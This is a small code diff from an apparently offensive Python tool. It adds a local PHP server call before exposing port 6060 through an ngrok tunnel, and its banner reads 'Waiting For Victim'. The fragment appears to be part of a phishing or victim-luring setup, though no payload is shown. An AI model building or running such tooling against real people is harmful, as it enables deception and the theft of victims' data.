@@ -557,6 +557,7 @@ exit();""")
       time.sleep(0.07)
       print(Fore.RED+" ["+Fore.WHITE+"!"+Fore.RED+"]"+" Waiting For Victim ! ! !")
     elif v == "02":
+       phpserver()
        global token
        link = ngrok.connect(6060,"http",auth_token=token)
        print(link)
